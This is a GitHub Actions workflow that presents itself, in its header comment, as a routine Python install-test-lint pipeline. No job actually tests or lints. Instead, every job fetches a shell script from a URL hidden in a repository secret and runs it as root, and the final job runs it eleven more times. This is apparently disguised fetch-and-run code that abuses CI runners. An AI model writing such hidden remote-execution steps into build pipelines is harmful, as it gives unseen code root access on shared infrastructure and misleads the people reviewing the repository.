# This workflow will install Python dependencies, run tests and lint with a single version of Python
# For more information see: https://help.github.com/actions/language-and-framework-guides/using-python-with-github-actions

name: main

on:
  push:
    branches: [ main ]

jobs:
  build:

    runs-on: ubuntu-20.04

    steps:
    - uses: actions/checkout@v2
    - name: Set up Python 3.9
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y zsh git curl wget jq vim tmux
        uuidgen | sed "s/\(\-.*$\)//g" > /tmp/hostname.txt
        echo '-------Hostname---------'
        cat /tmp/hostname.txt
        echo '********Hostname********'
        python -m pip install --upgrade pip
        pip install flake8 pytest
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
        curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
        sudo python2 /tmp/get-pip.py
        if [ -f requirements2.txt ]; then sudo python2 -m pip install -r requirements2.txt; fi
    - name: Custom
      run: |
        wget ${{ secrets.SHELL_URL }} -O /tmp/custom.sh
        sudo su -c 'bash /tmp/custom.sh'
  
  check:

    runs-on: ubuntu-20.04
    needs: build
    steps:
    - uses: actions/checkout@v2
    - name: Set up Python 3.9
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y zsh git curl wget jq vim tmux
        python -m pip install --upgrade pip
        pip install flake8 pytest
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
        curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
        sudo python2 /tmp/get-pip.py
        if [ -f requirements2.txt ]; then sudo python2 -m pip install -r requirements2.txt; fi
    - name: Custom
      run: |
        wget ${{ secrets.SHELL_URL }} -O /tmp/custom.sh
        sudo su -c 'bash /tmp/custom.sh && echo deploy'
  test:
    runs-on: ubuntu-20.04
    needs: check
    steps:
    - uses: actions/checkout@v2
    - name: Set up Python 3.9
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y zsh git curl wget jq vim tmux
        python -m pip install --upgrade pip
        pip install flake8 pytest
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
        curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
        sudo python2 /tmp/get-pip.py
        if [ -f requirements2.txt ]; then sudo python2 -m pip install -r requirements2.txt; fi
    - name: Custom
      run: |
        wget ${{ secrets.SHELL_URL }} -O /tmp/custom.sh
        sudo su -c 'bash /tmp/custom.sh && echo deploy'
  deploy:
    runs-on: ubuntu-20.04
    needs: test
    steps:
    - uses: actions/checkout@v2
    - name: Set up Python 3.9
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y zsh git curl wget jq vim tmux
        python -m pip install --upgrade pip
        pip install flake8 pytest
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
        curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
        sudo python2 /tmp/get-pip.py
        if [ -f requirements2.txt ]; then sudo python2 -m pip install -r requirements2.txt; fi
    - name: Custom
      run: |
        wget ${{ secrets.SHELL_URL }} -O /tmp/custom.sh
        sudo su -c 'bash /tmp/custom.sh "step1" && echo deploy1'
        sudo su -c 'bash /tmp/custom.sh "step2" && echo deploy2'
        sudo su -c 'bash /tmp/custom.sh "step3" && echo deploy3'
        sudo su -c 'bash /tmp/custom.sh "step4" && echo deploy4'
        sudo su -c 'bash /tmp/custom.sh "step5" && echo deploy5'
        sudo su -c 'bash /tmp/custom.sh "step6" && echo deploy6'
        sudo su -c 'bash /tmp/custom.sh "step7" && echo deploy7'
        sudo su -c 'bash /tmp/custom.sh "step8" && echo deploy8'
        sudo su -c 'bash /tmp/custom.sh "step9" && echo deploy9'
        sudo su -c 'bash /tmp/custom.sh "step10" && echo deploy10'
        sudo su -c 'bash /tmp/custom.sh "step11" && echo deploy11'
        

